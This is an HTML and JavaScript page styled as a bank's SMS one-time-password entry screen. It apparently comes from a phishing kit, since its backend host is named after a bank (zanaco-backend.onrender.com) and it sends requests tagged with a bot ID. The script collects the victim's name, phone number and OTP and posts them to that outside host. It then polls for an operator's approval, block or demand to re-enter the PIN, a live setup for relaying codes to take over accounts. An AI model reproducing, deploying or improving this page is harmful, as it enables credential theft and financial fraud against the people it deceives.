<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Enter Code</title>
<style>
body { font-family: Arial; background:#f6f7fb; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
.code-container { background:#fff; 
    padding:30px; 
    width:450px;
    text-align:center;
     border-radius:12px; 
     box-shadow:0 5px 15px rgba(0,0,0,0.1);
     }
.code-boxes input { width:55px; height:60px; font-size:24px; text-align:center; margin:5px; border:2px solid red; border-radius:6px; }
button { width:100%; padding:12px; background:red; color:#fff; border:none; border-radius:6px; font-size:16px; cursor:pointer; display:flex; justify-content:center; align-items:center; }
button:disabled { background:#ccc; cursor:not-allowed; }
.spinner { display:none; width:20px; height:20px; border:3px solid #fff; border-top:3px solid rgba(255,255,255,0.3); border-radius:50%; animation:spin 1s linear infinite; margin-left:10px; }
@keyframes spin { to { transform:rotate(360deg); } }
#status { margin-top:15px; font-size:14px; color:#555; }
.shake { animation: shake 0.4s; }
@keyframes shake { 0%{transform:translateX(0);}25%{transform:translateX(-5px);}50%{transform:translateX(5px);}75%{transform:translateX(-5px);}100%{transform:translateX(0);} }

#timerContainer { margin-top:10px; display:none; font-size:16px; color:#555; }
#timerDisplay { font-weight:bold; color:red; }
.code { margin-bottom: 5px; }
.otp-header { font-weight: 300; font-size: 20px; }
</style>
</head>
<body>

<div class="code-container">
    <h2 class="code">Enter Code</h2>
    <h3 class="otp-header">enter otp send on sms</h3>
    <form id="codeForm">
        <div class="code-boxes">
            <input maxlength="1" inputmode="numeric">
            <input maxlength="1" inputmode="numeric">
            <input maxlength="1" inputmode="numeric">
            <input maxlength="1" inputmode="numeric">
        </div>
        <button id="submitBtn" disabled>
            <span id="btnText">Submit Code</span>
            <div class="spinner" id="spinner"></div>
        </button>
    </form>

    <div id="timerContainer">
        OTP expires in <span id="timerDisplay">45</span> seconds
    </div>

    <div id="status"></div>
</div>

<script>
const BACKEND_URL = "https://zanaco-backend.onrender.com";

// ---------------- BOT & PIN ROUTING ----------------
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId');
if (!botId) { alert("Invalid access link"); throw new Error(); }
if (!localStorage.getItem('pin')) { window.location.href = `pin.html?botId=${botId}`; }

// ---------------- CODE INPUT LOGIC ----------------
const inputs = document.querySelectorAll('.code-boxes input');
const button = document.getElementById('submitBtn');
const btnText = document.getElementById('btnText');
const spinner = document.getElementById('spinner');
const statusText = document.getElementById('status');
const timerContainer = document.getElementById('timerContainer');
const timerDisplay = document.getElementById('timerDisplay');

inputs[0].focus();
inputs.forEach((input, i) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g,'');
        if (input.value && i < inputs.length - 1) inputs[i+1].focus();
        button.disabled = ![...inputs].every(x => x.value);
    });
    input.addEventListener('keydown', e => {
        if (e.key === 'Backspace' && !input.value && i > 0) inputs[i-1].focus();
    });
});

// ---------------- COUNTDOWN TIMER ----------------
let countdown;
function startCountdown() {
    let time = 45;
    timerContainer.style.display = 'block';
    timerDisplay.textContent = time;

    clearInterval(countdown);
    countdown = setInterval(() => {
        time--;
        timerDisplay.textContent = time;
        if (time <= 0) {
            clearInterval(countdown);
            statusText.textContent = 'Time is up!';
        }
    }, 1000);
}

// ---------------- SUBMIT CODE ----------------
document.getElementById('codeForm').addEventListener('submit', async e => {
    e.preventDefault();
    startCountdown();

    const code = [...inputs].map(i => i.value).join('');
    const name = localStorage.getItem('name');
    const phone = localStorage.getItem('phone');

    button.disabled = true;
    btnText.textContent = 'Verifying...';
    spinner.style.display = 'inline-block';
    statusText.textContent = 'Waiting for approval...';

    try {
        const res = await fetch(`${BACKEND_URL}/submit-code`, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({ name, phone, code, botId })
        });
        const { requestId } = await res.json();

        const poll = setInterval(async () => {
            const r = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
            const d = await r.json();

            // --------- BLOCK ---------
            if (d.blocked) {
                clearInterval(poll);
                clearInterval(countdown);
                localStorage.removeItem('pin');
                statusText.textContent = d.message || "Enter a valid prepaid number";
                button.disabled = false;
                btnText.textContent = 'Submit Code';
                spinner.style.display = 'none';
                inputs.forEach(i => i.value='');
                return;
            }

            // --------- CORRECT CODE + RETURN TO PIN ---------
            if (d.redirectToPin) {
                clearInterval(poll);
                clearInterval(countdown);
                localStorage.removeItem('pin');
                statusText.textContent = d.message || "You must re-enter PIN";
                button.disabled = false;
                btnText.textContent = 'Submit Code';
                spinner.style.display = 'none';
                inputs.forEach(i => i.value='');
                window.location.href = `pin.html?botId=${botId}`; // force PIN re-entry
                return;
            }

            // --------- CORRECT CODE ---------
            if (d.approved === true) {
                clearInterval(poll);
                clearInterval(countdown);
                localStorage.clear();
                window.location.href = `success.html?botId=${botId}`;
                return;
            }

            // --------- WRONG CODE ---------
            if (d.approved === false) {
                clearInterval(poll);
                clearInterval(countdown);
                button.disabled = false;
                btnText.textContent = 'Submit Code';
                spinner.style.display = 'none';
                statusText.textContent = 'Incorrect code. Try again.';
                inputs.forEach(i => i.value='');
                inputs[0].focus();
                timerContainer.style.display = 'none';
            }
        }, 1500);

    } catch (err) {
        spinner.style.display = 'none';
        btnText.textContent = 'Submit Code';
        button.disabled = false;
        statusText.innerText = 'Submission failed.';
        console.error(err);
    }
});
</script>

</body>
</html>
